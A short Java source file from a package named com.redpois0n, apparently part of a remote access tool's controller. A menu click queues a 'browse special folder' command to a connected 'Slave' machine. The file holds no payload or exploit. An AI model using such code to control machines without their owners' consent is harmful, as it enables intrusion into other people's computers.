package com.redpois0n.listeners;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JMenuItem;

import com.redpois0n.Slave;
import com.redpois0n.packets.OutgoingHeader;
import com.redpois0n.packets.incoming.PacketBuilder;

public class DirListener implements ActionListener {

	private Slave sl;

	public DirListener(Slave slave) {
		this.sl = slave;
	}

	public void actionPerformed(ActionEvent arg0) {
		JMenuItem item = (JMenuItem) arg0.getSource();
		sl.addToSendQueue(new PacketBuilder(OutgoingHeader.BROWSE_SPECIAL, item.getText().toUpperCase()));
	}

}
